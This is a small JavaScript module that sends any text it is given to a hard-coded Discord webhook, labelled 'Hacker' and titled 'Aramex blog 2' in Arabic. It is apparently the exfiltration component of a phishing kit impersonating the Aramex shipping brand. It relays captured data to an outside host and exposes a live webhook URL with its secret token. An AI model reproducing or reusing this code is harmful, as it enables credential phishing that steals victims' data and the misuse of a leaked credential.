import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324712099200634901/HoJ0Qt4olZsfJXPBU_pKUmy0pPBS4UyFX6iTgc6GswXdyM5QtimnwiFt9AkCeD4aAVji",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
